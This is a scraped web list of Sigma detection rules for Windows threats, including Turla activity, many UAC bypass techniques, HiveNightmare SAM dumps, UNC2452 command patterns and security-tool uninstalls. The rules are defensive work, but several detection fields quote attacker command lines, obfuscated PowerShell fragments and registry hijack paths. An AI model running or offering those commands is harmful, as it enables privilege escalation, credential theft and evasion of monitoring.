<li><a href="#">title:Troubleshooting Pack Cmdlet Execution id: 03409c93-a7c7-49ba-9a4c-a00badf2a153 status: experimental author: Nasreddine Bencherchali date: 2022/06/21 description: Detects execution of "TroubleshootingPack" cmdlets to leverage CVE-2022-30190 or action similar to "msdt" lolbin (as described in LOLBAS) references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Invoke-TroubleshootingPack' - 'C:\Windows\Diagnostics\System\PCW' - '-AnswerFile' - '-Unattended' condition: selection falsepositives: - Legitimate usage of "TroubleshootingPack" cmdlet for troubleshooting purposes level: medium tags: - attack.defense_evasion - attack.t1202 
<li><a href="#">title:TrustedPath UAC Bypass Pattern id: 4ac47ed3-44c2-4b1f-9d51-bf46e8914126 status: test description: Detects indicators of a UAC bypass method by mocking directories references: - - - author: Florian Roth date: 2021/08/27 tags: - attack.defense_evasion - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: Image|contains: 'C:\Windows \System32\' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:Turla ComRAT id: 7857f021-007f-4928-8b2c-7aedbe64bb82 status: test description: Detects Turla ComRAT patterns author: Florian Roth references: - date: 2020/05/26 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: '/index/index.php?h=' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.command_and_control - attack.t1071.001 - attack.g0010 
<li><a href="#">title:Turla Group Commands May 2020 id: 9e2e51c5-c699-4794-ba5a-29f5da40ac0c status: test description: Detects commands used by Turla group as reported by ESET in May 2020 author: Florian Roth references: - date: 2020/05/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'tracert -h 10 yahoo.com' - '.WSqmCons))|iex;' - 'Fr`omBa`se6`4Str`ing' selection2: CommandLine|contains|all: - 'net use ' - '@aol.co.uk' condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.g0010 - attack.execution - attack.t1059.001 - attack.t1053.005 - attack.t1027 
<li><a href="#">title:Turla Group Lateral Movement id: 75925535-ca97-4e0a-a850-00b5c00779dc status: experimental description: Detects automated lateral movement by Turla group references: - tags: - attack.g0010 - attack.execution - attack.t1059 - attack.lateral_movement - attack.t1021.002 - attack.discovery - attack.t1083 - attack.t1135 author: Markus Neis date: 2017/11/07 modified: 2021/09/19 logsource: category: process_creation product: windows detection: netCommand1: CommandLine: 'net view /DOMAIN' netCommand2: CommandLine: 'net session' netCommand3: CommandLine: 'net share' timeframe: 1m condition: netCommand1 or netCommand2 and netCommand3 level: medium falsepositives: - Unknown 
<li><a href="#">title:Turla Group Lateral Movement id: c601f20d-570a-4cde-a7d6-e17f99cb8e7f status: experimental description: Detects automated lateral movement by Turla group references: - tags: - attack.g0010 - attack.execution - attack.t1059 - attack.lateral_movement - attack.t1021.002 - attack.discovery - attack.t1083 - attack.t1135 author: Markus Neis date: 2017/11/07 modified: 2021/09/19 logsource: category: process_creation product: windows detection: selection: CommandLine: - 'net use \\%DomainController%\C$ "P@ssw0rd" *' - 'dir c:\\*.doc* /s' - 'dir %TEMP%\\*.exe' condition: selection level: critical falsepositives: - Unknown 
<li><a href="#">title:Turla Group Named Pipes id: 739915e4-1e70-4778-8b8a-17db02f66db1 status: test description: Detects a named pipe used by Turla group samples author: Markus Neis references: - Internal Research - date: 2017/11/06 modified: 2021/11/27 logsource: product: windows category: pipe_created definition: 'Note that you have to configure logging for Named Pipe Events in Sysmon config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon configuration (), but it is worth verifying. You can also use other repo, e.g. , . How to test detection? You can check powershell script from this site ' detection: selection: PipeName: - '\atctl' # - '\userpipe' # ruag apt case - '\iehelper' # ruag apt case - '\sdlrpc' # project cobra - '\comnap' # # - '\rpc' # may cause too many false positives : condition: selection falsepositives: - Unknown level: critical tags: - attack.g0010 - attack.execution - attack.t1106 
<li><a href="#">title:Turla PNG Dropper Service id: 1228f8e2-7e79-4dea-b0ad-c91f1d5016c1 status: test description: This method detects malicious services mentioned in Turla PNG dropper report by NCC Group in November 2018 author: Florian Roth references: - date: 2018/11/23 modified: 2021/11/30 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName: 'WerFaultSvc' condition: selection falsepositives: - Unlikely level: critical tags: - attack.persistence - attack.g0010 - attack.t1543.003 
<li><a href="#">title:Turla Service Install id: 1df8b3da-b0ac-4d8a-b7c7-6cb7c24160e4 status: test description: This method detects a service install of malicious services mentioned in Carbon Paper - Turla report by ESET author: Florian Roth references: - date: 2017/03/31 modified: 2021/11/30 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ServiceName: - 'srservice' - 'ipvpn' - 'hkmsvc' condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.g0010 - attack.t1543.003 
<li><a href="#">title:type: PROCTITLE proc
<li><a href="#">title:Typical HiveNightmare SAM File Export id: 6ea858a8-ba71-4a12-b2cc-5d83312404c7 status: experimental description: Detects files written by the different tools that exploit HiveNightmare author: Florian Roth date: 2021/07/23 references: - - - - logsource: product: windows category: file_event tags: - attack.credential_access - attack.t1552.001 - cve.2021.36934 detection: selection: - TargetFilename|contains: - '\hive_sam_' # Go version - '\SAM-2021-' # C++ version - '\SAM-2022-' # C++ version - '\SAM-2023-' # C++ version - '\SAM-haxx' # Early C++ versions - '\Sam.save' # PowerShell version - TargetFilename: - 'C:\windows\temp\sam' # C# version of HiveNightmare condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Files that accidentally contain these strings level: high 
<li><a href="#">title:UAC Bypass Abusing Winsat Path Parsing - File id: 155dbf56-e0a4-4dd0-8905-8a98705045e8 description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: 'C:\Users\' TargetFilename|endswith: - '\AppData\Local\Temp\system32\winsat.exe' - '\AppData\Local\Temp\system32\winmm.dll' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Abusing Winsat Path Parsing - Process id: 7a01183d-71a2-46ad-ad5c-acd989ac1793 description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - 'High' - 'System' ParentImage|endswith: '\AppData\Local\Temp\system32\winsat.exe' ParentCommandLine|contains: 'C:\Windows \system32\winsat.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Abusing Winsat Path Parsing - Registry id: 6597be7b-ac61-4ac8-bef4-d3ec88174853 description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) author: Christian Burkard date: 2021/08/30 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: '\Root\InventoryApplicationFile\winsat.exe|' TargetObject|endswith: '\LowerCaseLongPath' Details|startswith: 'c:\users\' Details|endswith: '\appdata\local\temp\system32\winsat.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:UAC Bypass Tool UACMe id: d38d2fa4-98e6-4a24-aff1-410b0c9ad177 description: Detects execution of UACMe (a tool used for UAC bypass) via default PE metadata author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: - Product: 'UACMe' - Company: 'REvol Corp' - OriginalFileName: 'Akagi.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using .NET Code Profiler on MMC id: 93a19907-d4f9-4deb-9f91-aac4692776a6 description: Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe DLL hijacking (UACMe 39) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: 'C:\Users\' TargetFilename|endswith: '\AppData\Local\Temp\pe386.dll' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using ChangePK and SLUI id: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc description: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61) author: Christian Burkard date: 2021/08/23 status: experimental references: - - - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\changepk.exe' ParentImage|endswith: '\slui.exe' IntegrityLevel: - 'High' - 'System' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using ComputerDefaults id: 3c05e90d-7eba-4324-9972-5d7f711a60a8 description: Detects the pattern of UAC Bypass using computerdefaults.exe (UACMe 59) author: Christian Burkard date: 2021/08/31 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - 'High' - 'System' Image: 'C:\Windows\System32\ComputerDefaults.exe' filter: ParentImage|contains: - ':\Windows\System32' - ':\Program Files' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using Consent and Comctl32 - File id: 62ed5b55-f991-406a-85d9-e8e8fdf18789 description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22) author: Christian Burkard date: 2021/08/23 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: 'C:\Windows\System32\consent.exe.@' TargetFilename|endswith: '\comctl32.dll' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using Consent and Comctl32 - Process id: 1ca6bd18-0ba0-44ca-851c-92ed89a61085 description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22) author: Christian Burkard date: 2021/08/23 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\consent.exe' Image|endswith: '\werfault.exe' IntegrityLevel: - 'High' - 'System' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using Disk Cleanup id: b697e69c-746f-4a86-9f59-7bfff8eab881 description: Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: '"\system32\cleanmgr.exe /autoclean /d C:' ParentCommandLine: 'C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule' IntegrityLevel: - 'High' - 'System' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using DismHost id: 853e74f9-9392-4935-ad3b-2e8c040dae86 description: Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: ParentImage|contains|all: - 'C:\Users\' - '\AppData\Local\Temp\' - '\DismHost.exe' IntegrityLevel: - 'High' - 'System' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using EventVwr id: 63e4f530-65dc-49cc-8f80-ccfa95c69d43 description: Detects the pattern of a UAC bypass using Windows Event Viewer author: Antonio Cocomazzi (idea), Florian Roth (rule) date: 2022/04/27 modified: 2022/04/27 status: experimental references: - - tags: - attack.defense_evasion - attack.privilege_escalation logsource: category: file_event product: windows detection: selection: TargetFilename|contains: '\AppData\Local\Microsoft\Event Viewer\RecentViews' filter: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using IDiagnostic Profile - File id: 48ea844d-19b1-4642-944e-fe39c2cc1fec status: experimental description: Detects the creation of a file by "dllhost.exe" in System32 directory part of "IDiagnosticProfileUAC" UAC bypass technique author: Nasreddine Bencherchali references: - date: 2022/07/03 logsource: product: windows category: file_event detection: selection: Image|endswith: '\DllHost.exe' TargetFilename|startswith: 'C:\Windows\System32\' TargetFilename|endswith: '.dll' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:UAC Bypass Using IDiagnostic Profile id: 4cbef972-f347-4170-b62a-8253f6168e6d status: experimental description: Detects the "IDiagnosticProfileUAC" UAC bypass technique author: Nasreddine Bencherchali date: 2022/07/03 references: - logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\DllHost.exe' ParentCommandLine|contains: ' /Processid:{12C21EA7-2EB8-4B55-9249-AC243DA8C666}' IntegrityLevel: - 'High' - 'System' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:UAC Bypass Using IEInstal - File id: bdd8157d-8e85-4397-bb82-f06cc9c71dbb description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: Image: 'C:\Program Files\Internet Explorer\IEInstal.exe' TargetFilename|startswith: 'C:\Users\' TargetFilename|contains: '\AppData\Local\Temp\' TargetFilename|endswith: 'consent.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using IEInstal - Process id: 80fc36aa-945e-4181-89f2-2f907ab6775d description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - 'High' - 'System' ParentImage|endswith: '\ieinstal.exe' Image|contains: '\AppData\Local\Temp\' Image|endswith: 'consent.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using MSConfig Token Modification - File id: 41bb431f-56d8-4691-bb56-ed34e390906f description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: 'C:\Users\' TargetFilename|endswith: '\AppData\Local\Temp\pkgmgr.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using MSConfig Token Modification - Process id: ad92e3f9-7eb6-460e-96b1-582b0ccbb980 description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: IntegrityLevel: - 'High' - 'System' ParentImage|endswith: '\AppData\Local\Temp\pkgmgr.exe' CommandLine: '"C:\Windows\system32\msconfig.exe" -5' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using NTFS Reparse Point - File id: 7fff6773-2baa-46de-a24a-b6eec1aba2d1 description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection: TargetFilename|startswith: 'C:\Users\' TargetFilename|endswith: '\AppData\Local\Temp\api-ms-win-core-kernel32-legacy-l1.DLL' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using NTFS Reparse Point - Process id: 39ed3c80-e6a1-431b-9df3-911ac53d08a7 description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36) author: Christian Burkard date: 2021/08/30 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection1: CommandLine|startswith: '"C:\Windows\system32\wusa.exe" /quiet C:\Users\' CommandLine|endswith: '\AppData\Local\Temp\update.msu' IntegrityLevel: - 'High' - 'System' selection2: ParentCommandLine: '"C:\Windows\system32\dism.exe" /online /quiet /norestart /add-package /packagepath:"C:\Windows\system32\pe386" /ignorecheck' IntegrityLevel: - 'High' - 'System' CommandLine|contains|all: - 'C:\Users\' - '\AppData\Local\Temp\' - '\dismhost.exe {' Image|endswith: '\DismHost.exe' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using PkgMgr and DISM id: a743ceba-c771-4d75-97eb-8a90f7f4844c description: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23) author: Christian Burkard date: 2021/08/23 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\pkgmgr.exe' Image|endswith: '\dism.exe' IntegrityLevel: - 'High' - 'System' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using Windows Media Player - File id: 68578b43-65df-4f81-9a9b-92f32711a951 description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) author: Christian Burkard date: 2021/08/23 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: file_event product: windows detection: selection1: TargetFilename|startswith: 'C:\Users\' TargetFilename|endswith: '\AppData\Local\Temp\OskSupport.dll' selection2: Image: 'C:\Windows\system32\DllHost.exe' TargetFilename: 'C:\Program Files\Windows Media Player\osk.exe' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using Windows Media Player - Process id: 0058b9e5-bcd7-40d4-9205-95ca5a16d7b2 description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) author: Christian Burkard date: 2021/08/23 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection1: Image: 'C:\Program Files\Windows Media Player\osk.exe' IntegrityLevel: - 'High' - 'System' selection2: Image: 'C:\Windows\System32\cmd.exe' ParentCommandLine: '"C:\Windows\system32\mmc.exe" "C:\Windows\system32\eventvwr.msc" /s' IntegrityLevel: - 'High' - 'System' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass Using Windows Media Player - Registry id: 5f9db380-ea57-4d1e-beab-8a2d33397e93 description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) author: Christian Burkard date: 2021/08/23 modified: 2022/03/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\C:\Program Files\Windows Media Player\osk.exe' Details: 'Binary Data' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:UAC Bypass Using WOW64 Logger DLL Hijack id: 4f6c43e2-f989-4ea5-bcd8-843b49a0317c description: Detects the pattern of UAC Bypass using a WoW64 logger DLL hijack (UACMe 30) author: Christian Burkard date: 2021/08/23 status: experimental references: - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_access product: windows detection: selection: SourceImage|contains: ':\Windows\SysWOW64\' GrantedAccess: '0x1fffff' CallTrace|startswith: 'UNKNOWN(0000000000000000)|UNKNOWN(0000000000000000)|' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass via Event Viewer id: 7c81fec3-1c1d-43b0-996a-46753041b1b6 status: experimental description: Detects UAC bypass method using Windows event viewer references: - - author: Florian Roth date: 2017/03/19 modified: 2022/03/26 logsource: product: windows category: registry_set detection: selection: TargetObject|startswith: 'HKCU\' TargetObject|endswith: '\mscfile\shell\open\command' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - car.2019-04-001 
<li><a href="#">title:UAC Bypass via Event Viewer id: be344333-921d-4c4d-8bb8-e584cf584780 related: - id: 7c81fec3-1c1d-43b0-996a-46753041b1b6 type: derived status: experimental description: Detects UAC bypass method using Windows event viewer references: - - author: Florian Roth date: 2017/03/19 modified: 2021/09/12 tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - car.2019-04-001 logsource: category: process_creation product: windows detection: methprocess: ParentImage|endswith: '\eventvwr.exe' filterprocess: Image|endswith: '\mmc.exe' condition: methprocess and not filterprocess fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:UAC Bypass via Sdclt id: 5b872a46-3b90-45c1-8419-f675db8053aa status: experimental description: Detects the pattern of UAC Bypass using registry key manipulation of sdclt.exe (e.g. UACMe 53) references: - - author: Omer Yampel, Christian Burkard date: 2017/03/17 modified: 2022/06/26 logsource: category: registry_set product: windows detection: selection1: EventType: SetValue TargetObject|endswith: Software\Classes\exefile\shell\runas\command\isolatedCommand selection2: EventType: SetValue TargetObject|endswith: Software\Classes\Folder\shell\open\command\SymbolicLinkValue Details|contains: '-1???\Software\Classes\' condition: 1 of selection* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - car.2019-04-001 
<li><a href="#">title:UAC Bypass Via Wsreset id: 6ea3bf32-9680-422d-9f50-e90716b12a66 status: test description: Unfixed method for UAC bypass from windows 10. WSReset.exe file associated with the Windows Store. It will run a binary file contained in a low-privilege registry. author: oscd.community, Dmitry Uchakin references: - - date: 2020/10/07 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: '\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command' condition: selection fields: - ComputerName - Image - EventType - TargetObject falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 
<li><a href="#">title:UAC Bypass With Fake DLL id: a5ea83a7-05a5-44c1-be2e-addccbbd8c03 status: experimental description: Attempts to load dismcore.dll after dropping it references: - tags: - attack.persistence - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - attack.t1574.002 author: oscd.community, Dmitry Uchakin date: 2020/10/06 modified: 2021/11/23 logsource: category: image_load product: windows detection: selection: Image|endswith: '\dism.exe' ImageLoaded|endswith: '\dismcore.dll' filter: ImageLoaded: 'C:\Windows\System32\Dism\dismcore.dll' condition: selection and not filter falsepositives: - Actions of a legitimate telnet client level: high 
<li><a href="#">title:UAC Bypass WSReset id: 89a9a0e0-f61a-42e5-8957-b1479565a658 description: Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config author: Christian Burkard date: 2021/08/23 status: experimental references: - - - tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\wsreset.exe' IntegrityLevel: - 'High' - 'System' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:UIPromptForCredentials DLLs id: 9ae01559-cf7e-4f8e-8e14-4c290a1b4784 description: Detects potential use of UIPromptForCredentials functions by looking for some of the DLLs needed for it. status: experimental date: 2020/10/20 modified: 2022/04/29 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.credential_access - attack.collection - attack.t1056.002 references: - - - logsource: category: image_load product: windows detection: selection: - ImageLoaded|endswith: - '\credui.dll' - '\wincredui.dll' - OriginalFileName: - 'credui.dll' - 'wincredui.dll' filter: - Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\explorer.exe' - 'C:\Program Files\' - 'C:\Users\\*\AppData\Local\Microsoft\OneDrive\\*\Microsoft.SharePoint.exe' - 'C:\Program Files (x86)\' - 'C:\Windows\ImmersiveControlPanel\SystemSettings.exe' - 'C:\Users\\*\AppData\Local\Microsoft\OneDrive\OneDrive.exe' - 'C:\Users\\*\AppData\Roaming\Spotify\Spotify.exe' - Image|endswith: '\opera_autoupdate.exe' - Image|contains: '\Local\Microsoft\OneDrive\' condition: selection and not filter falsepositives: - Other legitimate processes loading those DLLs in your environment. level: medium 
<li><a href="#">title:Unauthorized System Time Modification id: faa031b5-21ed-4e02-8881-2591f98d82ed status: test description: Detect scenarios where a potentially unauthorized application or user is modifying the system time. author: '@neu5ron' references: - Private Cuckoo Sandbox (from many years ago, no longer have hash, NDA as well) - Live environment caused by malware - date: 2019/02/05 modified: 2022/04/06 logsource: product: windows service: security definition: 'Requirements: Audit Policy : System > Audit Security State Change, Group Policy : Computer Configuration\Windows Settings\Security Settings\Advanced Audit Policy Configuration\Audit Policies\System\Audit Security State Change' detection: selection: EventID: 4616 filter1: ProcessName: - 'C:\Program Files\VMware\VMware Tools\vmtoolsd.exe' - 'C:\Windows\System32\VBoxService.exe' - 'C:\Windows\System32\oobe\msoobe.exe' filter2: ProcessName: 'C:\Windows\System32\svchost.exe' SubjectUserSid: 'S-1-5-19' condition: selection and not 1 of filter* falsepositives: - HyperV or other virtualization technologies with binary not listed in filter portion of detection level: medium tags: - attack.defense_evasion - attack.t1070.006 
<li><a href="#">title:UNC2452 PowerShell Pattern id: b7155193-8a81-4d8f-805d-88de864ca50c description: Detects a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports status: experimental references: - - - tags: - attack.execution - attack.t1059.001 - attack.t1047 # - sunburst author: Florian Roth date: 2021/01/20 modified: 2021/01/22 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains|all: - 'Invoke-WMIMethod win32_process -name create -argumentlist' - 'rundll32 c:\windows' selection2: CommandLine|contains|all: - 'wmic /node:' - 'process call create "rundll32 c:\windows' condition: selection1 or selection2 falsepositives: - Unknown, unlikely, but possible level: critical 
<li><a href="#">title:UNC2452 Process Creation Patterns id: 9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f description: Detects a specific process creation patterns as seen used by UNC2452 and provided by Microsoft as Microsoft Defender ATP queries status: experimental references: - tags: - attack.execution - attack.t1059.001 # - sunburst # - unc2452 author: Florian Roth date: 2021/01/22 modified: 2021/06/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: '7z.exe a -v500m -mx9 -r0 -p' selection2: ParentCommandLine|contains|all: - 'wscript.exe' - '.vbs' CommandLine|contains|all: - 'rundll32.exe' - 'C:\Windows' - '.dll,Tk_' selection3: ParentImage|endswith: '\rundll32.exe' ParentCommandLine|contains: 'C:\Windows' CommandLine|contains: 'cmd.exe /C ' selection4: CommandLine|contains|all: - 'rundll32 c:\windows\' - '.dll ' specific1: ParentImage|endswith: '\rundll32.exe' Image|endswith: '\dllhost.exe' filter1: CommandLine: - ' ' - '' condition: selection1 or selection2 or selection3 or selection4 or ( specific1 and not filter1 ) falsepositives: - Unknown level: high 
<li><a href="#">title:Unidentified Attacker November 2018 id: 3a3f81ca-652c-482b-adeb-b1c804727f74 related: - id: 7453575c-a747-40b9-839b-125a0aae324b type: derived status: stable description: A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016. references: - author: '@41thexplorer, Microsoft Defender ATP' date: 2018/11/20 modified: 2021/09/19 tags: - attack.execution - attack.t1218.011 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: 'ds7002.lnk' condition: selection level: high 
<li><a href="#">title:Unidentified Attacker November 2018 id: 7453575c-a747-40b9-839b-125a0aae324b status: stable description: A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016. references: - author: '@41thexplorer, Microsoft Defender ATP' date: 2018/11/20 modified: 2021/09/19 tags: - attack.execution - attack.t1218.011 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'cyzfc.dat,' CommandLine|endswith: 'PointFunctionCall' condition: selection level: high 
<li><a href="#">title:Uninstall Crowdstrike Falcon id: f0f7be61-9cf5-43be-9836-99d6ef448a18 status: experimental author: frack113 date: 2021/07/12 description: Adversaries may disable security tools to avoid possible detection of their tools and activities by uninstalling Crowdstrike Falcon references: - tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '\WindowsSensor.exe' - ' /uninstall' - ' /quiet' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Uninstall by admin level: medium 
<li><a href="#">title:Uninstall Sysinternals Sysmon id: 6a5f68d1-c4b5-46b9-94ee-5324892ea939 status: experimental description: Detects the uninstallation of Sysinternals Sysmon, which could be the result of legitimate administration or a manipulation for defense evasion references: - author: frack113 date: 2022/01/12 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \Sysmon64.exe - \Sysmon.exe CommandLine|contains: '-u' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Unsigned Image Loaded Into LSASS Process id: 857c8db3-c89b-42fb-882b-f681c7cf4da2 status: test description: Loading unsigned image (DLL, EXE) into LSASS process author: Teymur Kheirkhabarov, oscd.community references: - date: 2019/10/22 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: '\lsass.exe' Signed: 'false' condition: selection falsepositives: - Valid user connecting using RDP level: medium tags: - attack.credential_access - attack.t1003.001 
